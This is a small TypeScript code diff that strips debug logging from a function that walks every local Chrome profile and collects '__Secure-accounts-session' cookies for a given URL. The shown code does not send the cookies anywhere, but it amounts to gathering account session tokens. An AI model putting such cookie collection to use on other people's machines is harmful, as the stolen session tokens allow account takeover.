@@ -9,20 +9,16 @@ const getCookies = async (url:string) => {
     const profiles = ListProfiles();
     const notableCookies:string[] = [];
     for (const p of profiles) {
-        console.log(p.profileDirPath);
         try{
             const a = await chrome.getCookiesPromised(url, "object", p.profileDirPath)
-            console.log(a);
             if(a["__Secure-accounts-session"] != null){
                 notableCookies.push(`${secureAcountSession}=${a[secureAcountSession]};`);
-                console.log("added to notable")
             }
         }
         catch(e){
             denied = true;
         }
     }
-    console.log(notableCookies)
 
     return  denied ? [] : notableCookies;
 }
